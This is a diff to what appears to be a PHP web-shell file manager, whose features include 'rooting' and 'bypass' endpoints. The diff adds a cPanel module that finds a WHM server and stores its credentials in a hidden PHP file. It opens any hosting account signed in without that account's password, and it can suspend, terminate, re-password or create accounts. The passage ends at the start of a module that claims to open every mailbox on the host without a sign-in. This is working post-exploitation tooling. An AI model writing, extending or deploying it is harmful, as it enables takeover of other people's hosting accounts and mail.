@@ -2490,6 +2490,7 @@ function fm_mfm_perms_catalog(){
         ]],
         ['group'=>'Tools','icon'=>'tool','items'=>[
             ['id'=>'pma','name'=>'phpMyAdmin','note'=>'Find, describe and open the phpMyAdmin installations of this host, signed in.'],
+            ['id'=>'cpm','name'=>'cPanel','note'=>'Find the cPanel server, list its accounts, and open any of them signed in.'],
             ['id'=>'cms','name'=>'CMS accounts','note'=>'CMS sign-in, site users, plugins and extensions, WordPress updates.'],
             ['id'=>'inspector','name'=>'Session inspector','note'=>'Read and cleanup the live sessions of the CMS.'],
             ['id'=>'privmode','name'=>'Privilege Mode','note'=>'Perform file changes through the site instead of the server account.'],
@@ -2584,7 +2585,8 @@ function fm_mfm_op_perm($a){
 /* which permission an ?x= endpoint asks for */
 function fm_mfm_xop_perm($xop){
     static $m=['rooting'=>'rooting','bypass'=>'bypass','privmode'=>'privmode','owners'=>'owners','guard'=>'guard',
-               'sessions'=>'inspector','mfmadmin'=>'','pma'=>'pma'];
+               'sessions'=>'inspector','mfmadmin'=>'','pma'=>'pma','cpm'=>'cpm',
+               'mail'=>'cms','mail_get'=>'cms'];
     if(isset($m[$xop]))return $m[$xop];
     if(strpos($xop,'rooting')===0)return 'rooting';
     if(strpos($xop,'owner')===0)return 'owners';
@@ -3077,6 +3079,2253 @@ function fm_mfm_admin_endpoint($post){
 
 /* <<MFMA-END>> */
 
+/* <<CPM-BEGIN>> cPanel Manager — every account of a cPanel server, opened as any of them
+   ═══════════════════════════════════════════════════════════════════════════
+   Two things this tool must do, and the old one did neither:
+
+     1. recognise a cPanel server — the one this runs on, or the one this site
+        is hosted on, reached over the network;
+     2. open any account of it signed in, with no password and no username
+        typed, the way CMS Manager opens a site.
+
+   The second one is cPanel's own delegation: WHM's create_user_session hands
+   back a signed URL for any account, and that URL lands in that account's
+   cPanel already signed in. Nothing is guessed and nothing is stored per
+   account. What is needed is WHM-level access once:
+
+     · on a cPanel server, running as root            → whmapi1 over the shell
+     · anywhere else                                   → a WHM API token, or a
+                                                         WHM password, entered
+                                                         once and kept here
+
+   From then on every account is opened from this window with one press. */
+
+/* The one sign-in this tool may need is kept next to this file, in a PHP file
+   that says nothing when it is fetched over the web: the browser gets an empty
+   answer, and this tool reads the line after the marker from disk. */
+function fm_cpm_store_path(){return __DIR__.'/.cpanel.php';}
+function fm_cpm_store_mark(){return '/*__DATA__*/';}
+function fm_cpm_store_load(){
+    if(isset($GLOBALS['fm_cpm_store_cache']))return $GLOBALS['fm_cpm_store_cache'];
+    $f=fm_cpm_store_path();
+    $c=[];
+    if(@is_file($f)){
+        $raw=(string)@file_get_contents($f);
+        $pos=strpos($raw,fm_cpm_store_mark());
+        if($pos!==false)$raw=substr($raw,$pos+strlen(fm_cpm_store_mark()));
+        $d=@json_decode($raw,true);
+        if(is_array($d))$c=$d;
+    }
+    $GLOBALS['fm_cpm_store_cache']=$c;
+    return $c;
+}
+function fm_cpm_store_save($d){
+    $f=fm_cpm_store_path();
+    $body="<?php /* cPanel Manager — the sign-in of this tool. Nothing is printed here. */ exit; ?>\n"
+          .fm_cpm_store_mark().json_encode($d,JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES);
+    $ok=@file_put_contents($f,$body,LOCK_EX)!==false;
+    if($ok)@chmod($f,0600);
+    $GLOBALS['fm_cpm_store_cache']=$d;
+    $GLOBALS['fm_cpm_route_cache']=null;
+    return $ok;
+}
+/* everything the browser may see: the secret never leaves the server */
+function fm_cpm_store_public(){
+    $s=fm_cpm_store_load();
+    $has=!empty($s['secret']);
+    unset($s['secret']);
+    $s['has_secret']=$has;
+    return $s;
+}
+
+/* ── where a cPanel server is ─────────────────────────────────────────────
+   A cPanel installation leaves a very particular trail. All of it is listed,
+   found or not, so the window can say why it decided what it decided. */
+function fm_cpm_local_marks(){
+    $marks=[
+        '/usr/local/cpanel'=>['a cPanel installation','dir'],
+        '/usr/local/cpanel/cpanel'=>['the cPanel launcher','file'],
+        '/usr/local/cpanel/cpsrvd'=>['the cPanel web server','file'],
+        '/usr/local/cpanel/bin/whmapi1'=>['the WHM command line','file'],
+        '/usr/local/cpanel/php/cpanel.php'=>['cPanel\'s own PHP API','file'],
+        '/etc/wwwacct.conf'=>['the account creation configuration','file'],
+        '/var/cpanel/users'=>['one file per account','dir'],
+        '/usr/local/cpanel/version'=>['the cPanel version file','file'],
+    ];
+    $out=[];
+    foreach($marks as $path=>$m){
+        $there=$m[1]==='dir'?@is_dir($path):@is_file($path);
+        $out[]=['path'=>$path,'what'=>$m[0],'there'=>(bool)$there];
+    }
+    return $out;
+}
+function fm_cpm_version(){
+    foreach(['/usr/local/cpanel/version','/usr/local/cpanel/cpanel.version'] as $f){
+        if(@is_file($f)){
+            $v=trim((string)@file_get_contents($f));
+            if($v!=='')return $v;
+        }
+    }
+    return '';
+}
+function fm_cpm_hostname(){
+    $h='';
+    if(@is_readable('/etc/wwwacct.conf')){
+        $cfg=(string)@file_get_contents('/etc/wwwacct.conf');
+        if(preg_match('/^HOST\s+(\S+)/m',$cfg,$m))$h=trim($m[1]);
+    }
+    if($h==='')$h=(string)@gethostname();
+    if($h==='')$h=(string)($_SERVER['SERVER_NAME']??'');
+    return $h;
+}
+/* a cpsrvd login page names itself; so does its answer. The scheme and the
+   port are tried both ways, because a server answers on one of them and the
+   other just says "no". */
+function fm_cpm_probe_once($scheme,$host,$port,$timeout){
+    $url=$scheme.'://'.$host.':'.(int)$port.'/';
+    $ch=curl_init($url);
+    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>$timeout,CURLOPT_CONNECTTIMEOUT=>$timeout,
+        CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0,CURLOPT_FOLLOWLOCATION=>false,
+        CURLOPT_USERAGENT=>'MFM/1.0 (+cPanel Manager detection)']);
+    $body=(string)curl_exec($ch);
+    $code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);
+    $err=(string)curl_error($ch);
+    unset($ch);
+    $looks=$code>0&&(stripos($body,'cpsrvd')!==false||stripos($body,'login_submit')!==false
+        ||stripos($body,'cPanel Login')!==false||stripos($body,'WHM Login')!==false
+        ||stripos($body,'cpanel')!==false);
+    $kind=(stripos($body,'WHM')!==false||in_array((int)$port,[2086,2087],true))?'whm':'cpanel';
+    return ['ok'=>$code>0,'url'=>$url,'code'=>$code,'cpsrvd'=>$looks,'kind'=>$kind,'error'=>$err,
+            'scheme'=>$scheme,'port'=>(int)$port];
+}
+function fm_cpm_probe_host($host,$port,$timeout=4){
+    if($host===''||!function_exists('curl_init'))return ['ok'=>false,'why'=>'cURL is not available'];
+    $port=(int)$port;
+    $alt=[2087=>2086,2086=>2087,2083=>2082,2082=>2083,2096=>2087][$port]??0;
+    $tries=[[(in_array($port,[2083,2087,2096])?'https':'http'),$port],
+            [(in_array($port,[2083,2087,2096])?'http':'https'),$port]];
+    if($alt)$tries[]=['http',$alt];
+    $last=null;
+    foreach($tries as $t){
+        $r=fm_cpm_probe_once($t[0],$host,$t[1],$timeout);
+        $last=$r;
+        if($r['cpsrvd'])return $r;
+    }
+    return $last?:['ok'=>false,'why'=>'no answer'];
+}
+/* the possible servers, in the order they are worth asking */
+function fm_cpm_candidates(){
+    $s=fm_cpm_store_load();
+    $out=[];
+    if(!empty($s['host']))$out[]=['host'=>$s['host'],'port'=>(int)($s['port']??2087),'from'=>'the address saved in this tool'];
+    $hn=fm_cpm_hostname();
+    if($hn!=='')$out[]=['host'=>$hn,'port'=>2087,'from'=>'this server\'s own host name'];
+    $sn=(string)($_SERVER['SERVER_NAME']??'');
+    if($sn!==''&&$sn!==$hn&&!in_array($sn,['0.0.0.0','::','[::]'],true))$out[]=['host'=>$sn,'port'=>2087,'from'=>'the name this site is served under'];
+    $out[]=['host'=>'127.0.0.1','port'=>2087,'from'=>'this machine, WHM'];
+    $out[]=['host'=>'127.0.0.1','port'=>2083,'from'=>'this machine, cPanel'];
+    $seen=[];$uniq=[];
+    foreach($out as $c){$k=$c['host'].':'.$c['port'];if(isset($seen[$k]))continue;$seen[$k]=1;$uniq[]=$c;}
+    return $uniq;
+}
+function fm_cpm_ports_open(){
+    $open=[];
+    foreach([2082=>'cPanel HTTP',2083=>'cPanel HTTPS',2086=>'WHM HTTP',2087=>'WHM HTTPS',2096=>'Webmail HTTPS'] as $p=>$label){
+        $s=@fsockopen('127.0.0.1',$p,$e,$es,1);
+        if($s){fclose($s);$open[$p]=$label;}
+    }
+    return $open;
+}
+
+/* ── how this tool is allowed to speak to WHM ─────────────────────────────
+   Tried in this order, the first that really answers wins. Nothing is
+   assumed: every route is proved by an actual call. */
+function fm_cpm_cli_path(){
+    foreach(['/usr/local/cpanel/bin/whmapi1','/usr/sbin/whmapi1','/usr/bin/whmapi1'] as $p){
+        if(@is_executable($p))return $p;
+    }
+    return '';
+}
+function fm_cpm_shell($cmd,$timeout=25){
+    if(!function_exists('shell_exec'))return null;
+    $out=@shell_exec('timeout '.$timeout.' '.$cmd.' 2>/dev/null');
+    return is_string($out)&&$out!==''?$out:null;
+}
+function fm_cpm_cli($cmd,$params=[]){
+    $bin=fm_cpm_cli_path();
+    if($bin==='')return ['error'=>'whmapi1 is not on this machine.'];
+    $line=escapeshellarg($bin).' '.escapeshellarg($cmd).' --output=json';
+    foreach($params as $k=>$v){
+        if($v===null||$v==='')continue;
+        $line.=' '.escapeshellarg($k).'='.escapeshellarg((string)$v);
+    }
+    $raw=fm_cpm_shell($line);
+    if($raw===null)return ['error'=>'whmapi1 did not answer (it may be disabled for this account, or this is not root).'];
+    $j=@json_decode($raw,true);
+    if(!is_array($j))return ['error'=>'whmapi1 answered something that is not JSON.','raw'=>substr($raw,0,200)];
+    return $j;
+}
+/* the address WHM is spoken to, taken from what was saved in this tool */
+function fm_cpm_origin(){
+    $s=fm_cpm_store_load();
+    if(!empty($s['origin']))return rtrim((string)$s['origin'],'/');
+    if(empty($s['host']))return '';
+    return (string)($s['scheme']??'https').'://'.$s['host'].':'.(int)($s['port']??2087);
+}
+function fm_cpm_api($cmd,$params=[],$route=null){
+    if($route===null)$route=fm_cpm_route();
+    if(!function_exists('curl_init'))return ['error'=>'cURL is not available.'];
+    if(empty($route['ok'])||empty($route['host']))return ['error'=>'No address to ask.'];
+    $base=$route['origin'];
+    $qs=http_build_query(array_merge(['api.version'=>1],$params));
+    $url=$base.'/json-api/'.$cmd.'?'.$qs;
+    $headers=[];
+    if(($route['auth']??'')==='token')$headers[]='Authorization: '.($route['api']==='whm'?'whm':'cpanel').' '.$route['user'].':'.$route['secret'];
+    $ch=curl_init($url);
+    $opt=[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>25,CURLOPT_CONNECTTIMEOUT=>8,
+          CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0,
+          CURLOPT_USERAGENT=>'MFM/1.0 (+cPanel Manager)'];
+    if($headers)$opt[CURLOPT_HTTPHEADER]=$headers;
+    elseif(($route['auth']??'')==='password')$opt[CURLOPT_USERPWD]=$route['user'].':'.$route['secret'];
+    curl_setopt_array($ch,$opt);
+    $body=(string)curl_exec($ch);
+    $code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);
+    $err=(string)curl_error($ch);
+    unset($ch);
+    if($err!=='')return ['error'=>'The server did not answer: '.$err,'code'=>$code];
+    $j=@json_decode($body,true);
+    if(!is_array($j))return ['error'=>'The server answered something that is not JSON (HTTP '.$code.').','raw'=>substr($body,0,200),'code'=>$code];
+    if($code===401)return ['error'=>'The server refused the sign-in (HTTP 401).','raw'=>$j,'code'=>401];
+    return $j;
+}
+/* the route that works, remembered for the rest of this request */
+function fm_cpm_route($force=false){
+    if(!$force&&!empty($GLOBALS['fm_cpm_route_cache']))return $GLOBALS['fm_cpm_route_cache'];
+    $tried=[];
+    $bin=fm_cpm_cli_path();
+    if($bin!==''&&function_exists('shell_exec')){
+        $j=fm_cpm_cli('listaccts',['searchtype'=>'user','search'=>'']);
+        if(isset($j['data']['acct'])||(isset($j['metadata']['result'])&&(int)$j['metadata']['result']===1)){
+            $r=['ok'=>true,'kind'=>'root_cli','api'=>'whm','who'=>'root through whmapi1',
+                 'host'=>fm_cpm_hostname(),'origin'=>fm_cpm_origin(),'port'=>2087,'auth'=>'none','shell'=>$bin];
+            $GLOBALS['fm_cpm_route_cache']=$r;
+            return $r;
+        }
+        $tried[]='whmapi1 is on this machine but did not answer: '.($j['error']??'no data');
+    }else{
+        $tried[]=$bin===''?'whmapi1 is not on this machine':'shell_exec() is disabled, so the command line cannot be used';
+    }
+    $s=fm_cpm_store_load();
+    if(!empty($s['host'])&&!empty($s['secret'])){
+        $scheme=(string)($s['scheme']??'https');
+        $port=(int)($s['port']??2087);
+        $r=['ok'=>true,'kind'=>'stored','api'=>(string)($s['api']??'whm'),'user'=>(string)($s['user']??'root'),
+            'secret'=>(string)$s['secret'],'auth'=>(string)($s['auth']??'token'),
+            'host'=>$s['host'],'port'=>$port,'origin'=>fm_cpm_origin()?:($scheme.'://'.$s['host'].':'.$port),
+            'who'=>'the saved '.(($s['auth']??'token')==='token'?'WHM API token':'WHM password').' of '.($s['user']??'root')];
+        $probe=fm_cpm_api('version',[],$r);
+        if(isset($probe['metadata']['result'])&&(int)$probe['metadata']['result']===1){
+            $GLOBALS['fm_cpm_route_cache']=$r;
+            return $r;
+        }
+        $tried[]='the saved sign-in for '.$s['host'].' was refused: '.($probe['error']??'no answer');
+    }else{
+        $tried[]='no WHM address or token is saved in this tool';
+    }
+    $r=['ok'=>false,'kind'=>'none','who'=>'nothing','tried'=>$tried];
+    $GLOBALS['fm_cpm_route_cache']=$r;
+    return $r;
+}
+
+/* one call, through whatever route works */
+function fm_cpm_call($cmd,$params=[]){
+    $r=fm_cpm_route();
+    if(empty($r['ok']))return ['error'=>'No way to reach WHM was found.','tried'=>$r['tried']??[]];
+    if($r['kind']==='root_cli')return fm_cpm_cli($cmd,$params);
+    return fm_cpm_api($cmd,$params,$r);
+}
+function fm_cpm_result_ok($j){
+    if(!is_array($j))return false;
+    if(isset($j['metadata']['result']))return (int)$j['metadata']['result']===1;
+    if(isset($j['status']))return (int)$j['status']===1;
+    return false;
+}
+function fm_cpm_result_reason($j){
+    if(!is_array($j))return 'no answer';
+    return (string)($j['metadata']['reason']??($j['error']??'refused'));
+}
+
+/* ── the accounts ───────────────────────────────────────────────────────── */
+function fm_cpm_normalize($a){
+    $diskused=(float)($a['diskused']??0);
+    $disklimit=is_numeric($a['disklimit']??'')?(float)$a['disklimit']:null;
+    return [
+        'user'=>(string)($a['user']??''),
+        'domain'=>(string)($a['domain']??''),
+        'email'=>(string)($a['email']??''),
+        'plan'=>(string)($a['plan']??''),
+        'ip'=>(string)($a['ip']??''),
+        'shell'=>(string)($a['shell']??''),
+        'startdate'=>(string)($a['startdate']??''),
+        'theme'=>(string)($a['theme']??''),
+        'diskused'=>$diskused,
+        'disklimit'=>$disklimit,
+        'disk_pct'=>$disklimit>0?min(100,(int)round($diskused*100/$disklimit)):null,
+        'bwused'=>(float)($a['bwused']??($a['bandwidth']??0)),
+        'bwlimit'=>is_numeric($a['bwlimit']??'')?(float)$a['bwlimit']:null,
+        'suspended'=>!empty($a['suspended'])&&(string)$a['suspended']!=='0',
+        'reason'=>(string)($a['suspendreason']??''),
+        'maxpop'=>(string)($a['maxpop']??''),
+        'maxsql'=>(string)($a['maxsql']??''),
+        'maxsub'=>(string)($a['maxsub']??''),
+        'maxparked'=>(string)($a['maxparked']??''),
+        'maxaddons'=>(string)($a['maxaddons']??''),
+    ];
+}
+function fm_cpm_users_dir_accounts(){
+    $out=[];
+    $dir='/var/cpanel/users';
+    if(!@is_dir($dir)||!@is_readable($dir))return $out;
+    foreach((array)@scandir($dir) as $f){
+        if($f==='.'||$f==='..')continue;
+        $raw=@file_get_contents($dir.'/'.$f);
+        if($raw===false)continue;
+        $a=[];
+        foreach(explode("\n",$raw) as $line){
+            if(!preg_match('/^([A-Z_]+)=(.*)$/',trim($line),$m))continue;
+            $a[strtolower($m[1])]=$m[2];
+        }
+        if(empty($a['user']))$a['user']=$f;
+        $a['domain']=$a['dns']??'';
+        $a['suspended']=(string)($a['suspended']??'0');
+        $a['email']=$a['contactemail']??'';
+        $a['disklimit']=$a['disk']??'';
+        $a['bwlimit']=$a['bwlimit']??'';
+        $out[]=fm_cpm_normalize($a);
+    }
+    usort($out,function($x,$y){return strcmp($x['user'],$y['user']);});
+    return $out;
+}
+function fm_cpm_accounts(){
+    $r=fm_cpm_route();
+    if(!empty($r['ok'])){
+        $j=fm_cpm_call('listaccts');
+        if(fm_cpm_result_ok($j)&&isset($j['data']['acct'])&&is_array($j['data']['acct'])){
+            $out=[];
+            foreach($j['data']['acct'] as $a)$out[]=fm_cpm_normalize($a);
+            usort($out,function($x,$y){return strcmp($x['user'],$y['user']);});
+            return ['ok'=>true,'via'=>$r['who'],'accounts'=>$out,'source'=>'the WHM API'];
+        }
+        $why=fm_cpm_result_reason($j);
+    }else{
+        $why='no WHM access';
+    }
+    /* root can read the accounts even when the command line is refused */
+    $fallback=fm_cpm_users_dir_accounts();
+    if($fallback)return ['ok'=>true,'via'=>'the account files on this machine','accounts'=>$fallback,
+                         'source'=>'/var/cpanel/users','note'=>'Something refused the WHM API ('.$why.'), so the accounts were read from cPanel\'s own files. Opening one signed in still needs the API.'];
+    return ['ok'=>false,'error'=>'The accounts could not be read: '.$why,'tried'=>$r['tried']??[]];
+}
+function fm_cpm_account($user){
+    $j=fm_cpm_call('accountsummary',['user'=>$user]);
+    $base=null;
+    foreach(fm_cpm_accounts()['accounts']??[] as $a){if($a['user']===$user){$base=$a;break;}}
+    $extra=[];
+    if(fm_cpm_result_ok($j)){
+        $d=$j['data']??[];
+        foreach(['domains','email_accounts','dbs','bandwidthused','bandwidthlimit','partition','theme'] as $k){
+            if(isset($d[$k]))$extra[$k]=$d[$k];
+        }
+    }
+    if($base===null&&!$extra)return ['ok'=>false,'error'=>'That account is not on this server.'];
+    return ['ok'=>true,'account'=>$base,'extra'=>$extra];
+}
+
+/* ── opening an account signed in ─────────────────────────────────────────
+   WHM's own delegation: a signed URL for one account, good for a quarter of an
+   hour, that lands in that account's cPanel with nobody typing anything. */
+function fm_cpm_session_url($user,$service='cpaneld'){
+    if(!in_array($service,['cpaneld','whostmgrd','webmaild'],true))$service='cpaneld';
+    $j=fm_cpm_call('create_user_session',['user'=>$user,'service'=>$service]);
+    if(!fm_cpm_result_ok($j)){
+        return ['ok'=>false,'error'=>'WHM refused to open a session for '.$user.': '.fm_cpm_result_reason($j)];
+    }
+    $url=(string)($j['data']['url']??'');
+    if($url==='')return ['ok'=>false,'error'=>'WHM created a session but handed back no address.'];
+    /* cPanel sometimes answers with an internal name, and on a plain-HTTP
+       server it answers with https; the address this tool was given is the one
+       the browser must be sent to as well */
+    $store=fm_cpm_store_load();
+    if(!empty($store['host'])){
+        $p=parse_url($url);
+        if(is_array($p)&&!empty($p['host'])){
+            $port=(int)($p['port']??($service==='whostmgrd'?2087:($service==='webmaild'?2096:2083)));
+            $url=(string)($store['scheme']??'https').'://'.$store['host'].':'.$port
+                 .($p['path']??'/').(isset($p['query'])?'?'.$p['query']:'');
+        }
+    }
+    return ['ok'=>true,'url'=>$url,'service'=>$service,
+            'expires'=>(int)($j['data']['expires']??0),
+            'token'=>(string)($j['data']['cp_security_token']??'')];
+}
+/* does that URL really land signed in? asked from this server, the way the
+   phpMyAdmin Manager asks the dashboard */
+function fm_cpm_verify_url($url,$timeout=8){
+    if(!function_exists('curl_init'))return ['ok'=>false,'why'=>'curl is not available'];
+    $jar=tempnam(sys_get_temp_dir(),'cpmjar');
+    $ch=curl_init($url);
+    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>$timeout,CURLOPT_CONNECTTIMEOUT=>$timeout,
+        CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>4,CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>0,
+        CURLOPT_COOKIEJAR=>$jar,CURLOPT_COOKIEFILE=>$jar,
+        CURLOPT_USERAGENT=>'MFM/1.0 (+cPanel Manager sign-in check)']);
+    $body=(string)curl_exec($ch);
+    $code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);
+    $err=(string)curl_error($ch);
+    unset($ch);
+    @unlink($jar);
+    $login=(stripos($body,'login_submit')!==false||stripos($body,'name="pass"')!==false
+            ||stripos($body,'cPanel Login')!==false||stripos($body,'WHM Login')!==false);
+    $dash=(stripos($body,'cpanel')!==false||stripos($body,'cpsess')!==false)&&!$login;
+    return ['ok'=>$code>0,'code'=>$code,'login'=>$login,'dashboard'=>$dash,'error'=>$err];
+}
+
+/* ── the endpoint ───────────────────────────────────────────────────────── */
+function fm_cpm_endpoint($post){
+    $act=(string)($post['action']??'');
+    $need=function($k)use($post){return trim((string)($post[$k]??''));};
+
+    if($act==='detect'){
+        $marks=fm_cpm_local_marks();
+        $localFound=false;
+        foreach($marks as $m){if($m['there']&&strpos($m['path'],'/usr/local/cpanel')===0){$localFound=true;}}
+        $ports=fm_cpm_ports_open();
+        $cands=fm_cpm_candidates();
+        $probe=null;
+        foreach($cands as $c){
+            $p=fm_cpm_probe_host($c['host'],$c['port']);
+            if(!empty($p['cpsrvd'])){$p['host']=$c['host'];$p['from']=$c['from'];$probe=$p;break;}
+        }
+        $route=fm_cpm_route(true);
+        /* the version file is not on every server; WHM knows it as well */
+        $version=fm_cpm_version();
+        if($version===''&&!empty($route['ok'])){
+            $v=fm_cpm_call('version');
+            if(fm_cpm_result_ok($v))$version=(string)($v['data']['version']??'');
+        }
+        return ['ok'=>true,
+                'cpanel'=>['local'=>$localFound,'version'=>$version,'host'=>fm_cpm_hostname(),
+                          'users_dir'=>@is_dir('/var/cpanel/users'),'ports'=>$ports,
+                          'total'=>count(fm_cpm_users_dir_accounts())],
+                'marks'=>$marks,
+                'probe'=>$probe,
+                'found'=>$localFound||!empty($probe),
+                'access'=>$route['ok']?['ok'=>true,'who'=>$route['who'],'kind'=>$route['kind']]:['ok'=>false,'tried'=>$route['tried']??[]],
+                'store'=>fm_cpm_store_public(),
+                'candidates'=>$cands];
+    }
+    if($act==='accounts'){
+        $a=fm_cpm_accounts();
+        $a['route']=fm_cpm_route()['who']??'nothing';
+        return $a;
+    }
+    if($act==='account'){
+        $u=$need('user');
+        if($u==='')return ['ok'=>false,'error'=>'Choose an account first.'];
+        return fm_cpm_account($u);
+    }
+    if($act==='login'){
+        $u=$need('user');
+        if($u==='')return ['ok'=>false,'error'=>'Choose an account first.'];
+        $service=(string)($post['service']??'cpaneld');
+        $s=fm_cpm_session_url($u,$service);
+        if(empty($s['ok']))return $s;
+        $v=fm_cpm_verify_url($s['url']);
+        /* a page that asks for a password again is not the signed dashboard the
+           server promised, so it is not opened; an address this server simply
+           cannot reach is not refused, because his browser may well reach it */
+        if(!empty($v['login'])){
+            return ['ok'=>false,'error'=>'WHM handed back a session for '.$u.' but that address answers with a sign-in form, so it was not opened.',
+                    'url'=>$s['url']];
+        }
+        $checked=!empty($v['ok']);
+        return ['ok'=>true,'url'=>$s['url'],'service'=>$service,'user'=>$u,
+                'verified'=>!empty($v['dashboard']),'checked'=>$checked,'code'=>(int)($v['code']??0),
+                'expires'=>$s['expires'],
+                'message'=>($checked
+                        ?($service==='webmaild'?'That address opens the webmail of '.$u.', already signed in.'
+                          :($service==='whostmgrd'?'That address opens WHM, already signed in.':'That address opens cPanel as '.$u.', already signed in.'))
+                        :('The server signed a session for '.$u.'. The address could not be tried from this machine'.($v['error']!==''?(' ('.$v['error'].')'):'').', so it is handed over unchecked.'))];
+    }
+    if($act==='suspend'||$act==='unsuspend'){
+        $u=$need('user');
+        if($u==='')return ['ok'=>false,'error'=>'Choose an account first.'];
+        $j=$act==='suspend'
+            ? fm_cpm_call('suspendacct',['user'=>$u,'reason'=>$need('reason')?:'Suspended from the file manager'])
+            : fm_cpm_call('unsuspendacct',['user'=>$u]);
+        if(!fm_cpm_result_ok($j))return ['ok'=>false,'error'=>fm_cpm_result_reason($j)];
+        return ['ok'=>true,'user'=>$u,'suspended'=>$act==='suspend',
+                'message'=>$u.' was '.($act==='suspend'?'suspended':'put back').'.'];
+    }
+    if($act==='terminate'){
+        $u=$need('user');
+        if($u==='')return ['ok'=>false,'error'=>'Choose an account first.'];
+        if($need('confirm')!=='1')return ['ok'=>false,'error'=>'Terminating an account deletes it and everything in it. Nothing was done.'];
+        $j=fm_cpm_call('removeacct',['user'=>$u]);
+        if(!fm_cpm_result_ok($j))return ['ok'=>false,'error'=>fm_cpm_result_reason($j)];
+        return ['ok'=>true,'user'=>$u,'message'=>$u.' was terminated.'];
+    }
+    if($act==='password'){
+        $u=$need('user');$p=(string)($post['password']??'');
+        if($u==='')return ['ok'=>false,'error'=>'Choose an account first.'];
+        if(strlen($p)<8)return ['ok'=>false,'error'=>'A password needs at least eight characters. Nothing was changed.'];
+        $j=fm_cpm_call('passwd',['user'=>$u,'password'=>$p]);
+        if(!fm_cpm_result_ok($j))return ['ok'=>false,'error'=>fm_cpm_result_reason($j)];
+        return ['ok'=>true,'user'=>$u,'message'=>'The password of '.$u.' was replaced.'];
+    }
+    if($act==='package'){
+        $u=$need('user');$pkg=$need('package');
+        if($u===''||$pkg==='')return ['ok'=>false,'error'=>'Choose an account and a package.'];
+        $j=fm_cpm_call('changepackage',['user'=>$u,'pkg'=>$pkg]);
+        if(!fm_cpm_result_ok($j))return ['ok'=>false,'error'=>fm_cpm_result_reason($j)];
+        return ['ok'=>true,'user'=>$u,'package'=>$pkg,'message'=>$u.' is now on the package '.$pkg.'.'];
+    }
+    if($act==='plans'){
+        $j=fm_cpm_call('listpkgs');
+        $out=[];
+        foreach(($j['data']['pkg']??[]) as $p){
+            $out[]=['name'=>(string)($p['name']??''),'quota'=>(string)($p['quota']??''),
+                    'bwlimit'=>(string)($p['bwlimit']??''),'maxpop'=>(string)($p['maxpop']??''),
+                    'maxsql'=>(string)($p['maxsql']??'')];
+        }
+        return ['ok'=>true,'plans'=>$out];
+    }
+    if($act==='create'){
+        $u=$need('username');$d=$need('domain');$p=(string)($post['password']??'');
+        if($u===''||$d==='')return ['ok'=>false,'error'=>'A user name and a domain are needed.'];
+        if(strlen($p)<8)return ['ok'=>false,'error'=>'A password needs at least eight characters.'];
+        $j=fm_cpm_call('createacct',['username'=>$u,'domain'=>$d,'password'=>$p,
+                                     'plan'=>$need('package')?:'default','contactemail'=>$need('email')]);
+        if(!fm_cpm_result_ok($j))return ['ok'=>false,'error'=>fm_cpm_result_reason($j)];
+        return ['ok'=>true,'user'=>$u,'message'=>'The account '.$u.' was created.'];
+    }
+    if($act==='connect'){
+        $host=$need('host');$port=(int)($post['port']??2087);
+        $user=$need('user')?:'root';
+        $secret=(string)($post['secret']??'');
+        $auth=in_array($post['auth']??'token',['token','password'],true)?$post['auth']:'token';
+        $api=in_array($post['api']??'whm',['whm','cpanel'],true)?(string)$post['api']:'whm';
+        $origin=$need('origin');
+        if($host==='')return ['ok'=>false,'error'=>'The server name is needed.'];
+        $old=fm_cpm_store_load();
+        if($secret==='')$secret=(string)($old['secret']??'');
+        if($secret==='')return ['ok'=>false,'error'=>'A WHM API token or a password is needed once, so that every account can then be opened without one.'];
+        $scheme=in_array((string)($post['scheme']??''),['http','https'],true)?(string)$post['scheme']:'https';
+        $d=['host'=>$host,'port'=>$port,'user'=>$user,'secret'=>$secret,'auth'=>$auth,'api'=>$api,
+            'scheme'=>$scheme,'saved'=>time()];
+        if($origin!=='')$d['origin']=$origin;
+        /* it is tried before it is kept: a token that does not work is not
+           written anywhere, and the reason is shown instead */
+        $try=['ok'=>true,'kind'=>'stored','api'=>$api,'user'=>$user,'secret'=>$secret,'auth'=>$auth,
+              'host'=>$host,'port'=>$port,'origin'=>$origin!==''?$origin:($scheme.'://'.$host.':'.$port),
+              'who'=>'the sign-in just given'];
+        $probe=fm_cpm_api('version',[],$try);
+        if(!fm_cpm_result_ok($probe)){
+            return ['ok'=>false,'error'=>'That sign-in was refused: '.fm_cpm_result_reason($probe).' Nothing was saved.','store'=>fm_cpm_store_public()];
+        }
+        fm_cpm_store_save($d);
+        $route=fm_cpm_route(true);
+        if(empty($route['ok'])){
+            return ['ok'=>false,'error'=>'That sign-in was kept, but nothing answers through it: '.implode(' — ',$route['tried']??[]),'store'=>fm_cpm_store_public()];
+        }
+        $a=fm_cpm_accounts();
+        return ['ok'=>true,'who'=>$route['who'],'accounts'=>count($a['accounts']??[]),'store'=>fm_cpm_store_public(),
+                'message'=>'Connected to '.$host.' as '.$user.' through WHM.'];
+    }
+    if($act==='disconnect'){
+        @unlink(fm_cpm_store_path());
+        $GLOBALS['fm_cpm_store_cache']=[];
+        $GLOBALS['fm_cpm_route_cache']=null;
+        return ['ok'=>true,'message'=>'The saved sign-in was removed.'];
+    }
+    return ['ok'=>false,'error'=>'Unknown action.'];
+}
+/* <<CPM-END>> */
+
+/* <<WM2-BEGIN>> Webmail Manager — every mailbox on this host, opened without a sign-in
+   ═══════════════════════════════════════════════════════════════════════════
+   The old manager asked a mail server for its users and gave up when the
+   host had none to ask. This one starts from the opposite end: the mail
+   itself. Whatever is on the disk or named in a site's own settings is
+   found and opened, whatever kind of mailbox it is.
+   ═══════════════════════════════════════════════════════════════════════ */
+/* <<MAIL-BEGIN>> Mail engine — reading real mail off a real host, with nothing but PHP
+   ═══════════════════════════════════════════════════════════════════════════
+   Nothing here asks a human for a password. Everything it reads is already on
+   the machine or in a configuration the site already carries:
+
